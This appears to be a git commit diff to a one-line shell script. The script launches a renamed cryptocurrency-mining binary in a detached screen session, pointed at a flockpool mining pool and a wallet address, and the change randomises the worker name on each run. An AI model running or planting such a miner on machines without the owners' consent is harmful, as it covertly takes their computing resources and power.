af63750c20456bc457555fc84f5e2f43c657eafd
renilo <88342640+renilo@users.noreply.github.com>
2021-11-15 19:04:48 +0700

    Update baru-hajar.sh

--- baru-hajar.sh
+++ baru-hajar.sh
@@ -1,1 +1,1 @@
-screen -dmS Running ./meki -a gr -o eu.flockpool.com:4444 -u RGA4LQvjY9E7G5WSG6ZZuTmDB5sKr3Hmj5.TEST1
+screen -dmS Running ./meki -a gr -o eu.flockpool.com:4444 -u RGA4LQvjY9E7G5WSG6ZZuTmDB5sKr3Hmj5.$(echo $(shuf -i 1-999999 -n 1)-MEKI)
